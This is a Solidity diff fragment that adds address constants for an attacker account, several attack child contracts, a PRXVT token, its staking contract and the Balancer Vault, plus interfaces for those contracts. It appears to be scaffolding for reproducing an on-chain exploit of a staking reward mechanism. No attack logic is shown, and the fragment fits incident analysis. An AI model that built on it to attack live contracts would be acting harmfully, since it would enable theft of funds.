+    address internal constant attacker_eoa = 0x7407f9bdc4140d5e284ea7De32A9De6037842f45; // Addresses.attacker_eoa = 0x7407f9bdc4140d5e284ea7de32a9de6037842f45 label=attacker_eoa roles=attacker_eoa|contract|attack_address|sender source=tx_metadata.from confidence=high
+    address internal constant AgentTokenV2 = 0x7BaB5D2e3EbdE7293888B3f4c022aAAAD88Ae2db; // Addresses.AgentTokenV2 = 0x7bab5d2e3ebde7293888b3f4c022aaaad88ae2db label=AgentTokenV2 roles=asset|contract|attack_address|recipient source=etherscan_v2 confidence=high
+    address internal constant attack_child_8466 = 0x8D7bf27794B53129a143b120B1852Fe3048E8466; // Addresses.attack_child_8466 = 0x8d7bf27794b53129a143b120b1852fe3048e8466 label=attack_child roles=attacker_contract|code_contract|contract|attack_child_contract|localized_contract|attack_address|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
+    address internal constant attack_child_960D = 0x9A95CEe3B8Ef78b76d3f38dC45F2230Bd4fC960d; // Addresses.attack_child_960D = 0x9a95cee3b8ef78b76d3f38dc45f2230bd4fc960d label=attack_child roles=attacker_contract|code_contract|contract|attack_child_contract|localized_contract|attack_address|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
+    address internal constant attack_child_5349 = 0x9ff99efAd40cD6FF67d7552bBEc5434653FA5349; // Addresses.attack_child_5349 = 0x9ff99efad40cd6ff67d7552bbec5434653fa5349 label=attack_child roles=attacker_contract|code_contract|contract|attack_child_contract|localized_contract|attack_address|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
+    address internal constant attack_child_B5EB = 0xB649491dcBC08560eCD2a8AE621bCf1d33B9b5eb; // Addresses.attack_child_B5EB = 0xb649491dcbc08560ecd2a8ae621bcf1d33b9b5eb label=attack_child roles=attacker_contract|code_contract|contract|attack_child_contract|localized_contract|attack_address|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
+    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8; // Addresses.BalancerVault = 0xba12222222228d8ba445958a75a0704d566bf2c8 label=BalancerVault roles=known_protocol source=poc_sketch.known_addresses confidence=high
+    address internal constant PRXVT = 0xC2FF2E5aa9023b1bb688178a4a547212f4614bc0; // Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium
+    address internal constant attack_child_BD4E = 0xd6E87E48968B44c5Eb79ee3f7697bB8efa19bD4E; // Addresses.attack_child_BD4E = 0xd6e87e48968b44c5eb79ee3f7697bb8efa19bd4e label=attack_child roles=attacker_contract|code_contract|contract|attack_child_contract|localized_contract|attack_address|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
+    address internal constant stPRXVT = 0xDAc30a5e2612206E2756836Ed6764EC5817e6Fff; // Addresses.stPRXVT = 0xdac30a5e2612206e2756836ed6764ec5817e6fff label=PRXVTStaking token_symbol=stPRXVT roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
+    address internal constant attack_child_F4AD = 0xEA6E0B9f162E5532389f32832529a794bf10F4AD; // Addresses.attack_child_F4AD = 0xea6e0b9f162e5532389f32832529a794bf10f4ad label=attack_child roles=attacker_contract|code_contract|contract|attack_child_contract|localized_contract|attack_address|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
+    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF; // Addresses.A_FFFFFF_FFFF = 0xffffffffffffffffffffffffffffffffffffffff label=unresolved roles=attack_address source=unresolved confidence=low
+}
+
+interface Iattack_child {
+    function execute(address, address, address) external;
+}
+
+interface Iattack_child_21A6 {
+    function execute(address, address, address) external;
+}
+
+interface Iattack_child_38A8 {
+    function execute(address, address, address) external;
+}
+
+interface Iattack_child_5349 {
+    function execute(address, address, address) external;
+}
+
+interface Iattack_child_7D8E {
+    function execute(address, address, address) external;
+}
+
+interface Iattack_child_8466 {
+    function execute(address, address, address) external;
+}
+
+interface Iattack_child_960D {
+    function execute(address, address, address) external;
+}
+
+interface Iattack_child_B5EB {
+    function execute(address, address, address) external;
+}
+
+interface Iattack_child_BD4E {
+    function execute(address, address, address) external;
+}
+
+interface Iattack_child_F368 {
+    function execute(address, address, address) external;
+}
+
+interface Iattack_child_F4AD {
+    function execute(address, address, address) external;
 }
 
 interface IstPRXVT {
     function claimReward() external;
     function earned(address) external view returns (uint256);
 }
+
